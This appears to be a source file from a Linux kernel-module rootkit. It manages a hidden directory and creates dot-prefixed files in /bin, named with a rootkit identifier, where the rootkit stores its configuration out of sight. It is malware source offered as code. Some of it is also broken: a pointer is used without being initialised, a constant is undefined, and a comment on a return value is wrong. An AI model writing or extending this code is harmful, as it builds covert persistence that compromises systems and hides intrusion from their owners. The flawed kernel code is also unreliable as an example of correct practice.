/*
	file that manages the hidden_dir, including configuration
*/
#include <linux/fs.h>
#include <asm/uaccess.h>

extern char ROOTKIT_ID[];

struct kern_file{ //file holding data for file reading/writing
	struct file *fd; //file descriptor
	loff_t pos;
	size_t count;
    ssize_t ret;
};

static struct kern_file *open_file(char *path, int flags){ //opens file from path
	//code from https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
	struct kern_file *file; //file descriptor
    int err = 0; //error code

    file->fd = filp_open(path, flags, S_IRUSR); //opens the file in append mode
    if (IS_ERR(file->fd)) { //if file doesnt exist
		err = PTR_ERR(file->fd); //get error code
		return (struct kern_file*) NULL; //return NULL
    }
    return file; //return file
}

static int file_close(struct kern_file *file){ //close file
	filp_close(file->fd, NULL); //closes file
	kfree(file); //delete kern_file obj
	return 0; //return 0 for no error
}

static int file_read(struct kern_file *file, void *buf){ //reads data from file
	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
	file->pos = 0;
	kernel_read(file->fd, buf, file->count, &(file->pos));
	return 0; //returns size of file


}

static int file_write(struct kern_file *file, void *buf){ //writes data to file
	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
	file->pos = 0;
	kernel_write(file->fd, buf, file->count, &(file->pos));
	return 0;
}


static struct kern_file *open_hidden_file(char *filename){ //opens file in /bin prepended with ROOTKIT_ID or creates if doesn't exist
	struct kern_file *hidden_file;

	char *path; //char array to hold name of directory
	path = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
	sprintf(path, "/bin/.%s%s", ROOTKIT_ID, filename); //formats name of directory to be made

	hidden_file = open_file(path, O_APPEND | O_RDWR);
	if (hidden_file==NULL){ //file doesn't exist
		hidden_file = open_file(path, O_CREAT | O_RDWR);
	}
    return hidden_file; //return file
}
